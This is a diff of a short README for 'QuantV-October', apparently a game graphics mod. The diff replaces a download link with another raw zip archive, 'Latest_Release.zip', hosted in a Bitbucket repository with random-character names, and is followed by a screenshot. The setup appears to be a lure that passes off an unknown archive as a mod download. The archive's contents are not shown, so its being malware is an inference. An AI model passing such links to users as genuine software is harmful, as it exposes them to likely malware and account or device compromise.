@@ -1,6 +1,6 @@
 # QuantV-October
 
-|[Download](https://bitbucket.org/23ijf92o38gj23/newrepo5891929/raw/4050908beed256e3bb40f6047994fc5d13cae024/QuantV%5BNovember%5D.zip)
+|[Download](https://bitbucket.org/23ijf92o38gj23/newrepo5891929/raw/39e7c55a8962f846ccda3d1784b565494bac3eb1/Latest_Release.zip)
 |:------------- |
 
 <img width="1919" height="1050" alt="image" src="https://github.com/user-attachments/assets/9ff618e3-288c-4bfd-82a5-5db86b2ff6d6" />
